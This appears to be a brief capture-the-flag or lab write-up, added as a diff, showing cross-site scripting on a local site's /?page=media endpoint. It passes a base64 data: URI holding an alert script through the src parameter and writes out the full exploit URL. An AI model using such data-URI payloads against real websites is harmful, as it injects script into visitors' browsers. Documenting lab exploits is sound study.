@@ -1,0 +1,8 @@
+Images on homepage link to /?page=media with url parameter src
+If you change src to a base64 dataset, you can show anything you want
+
+For example: the script <script>alert("lol")</script>
+in Base64 is PHNjcmlwdD5hbGVydCgibG9sIik8L3NjcmlwdD4=
+
+When you access http://192.168.1.30/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgibG9sIik8L3NjcmlwdD4=
+It will in theory run this script
